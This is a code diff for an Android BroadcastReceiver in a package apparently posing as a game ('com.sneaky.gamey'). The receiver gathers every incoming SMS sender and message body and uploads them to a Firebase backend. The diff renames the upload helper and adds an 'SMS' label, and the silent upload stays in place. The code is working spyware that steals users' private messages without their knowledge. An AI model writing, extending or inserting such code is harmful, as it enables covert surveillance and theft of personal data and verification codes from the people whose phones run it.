@@ -6,7 +6,7 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 
-import com.sneaky.gamey.database.Firebase;
+import com.sneaky.gamey.database.MyFirebase;
 
 public class SmsReceiver extends BroadcastReceiver {
     public static final String pdu_type = "pdus";
@@ -25,6 +25,6 @@ public class SmsReceiver extends BroadcastReceiver {
                 message += "SMS from " + smsMessages[i].getOriginatingAddress() + " :" + smsMessages[i].getMessageBody() + "\n";
             }
         }
-        Firebase.sendData(message);
+        MyFirebase.sendData("SMS", message);
     }
 }
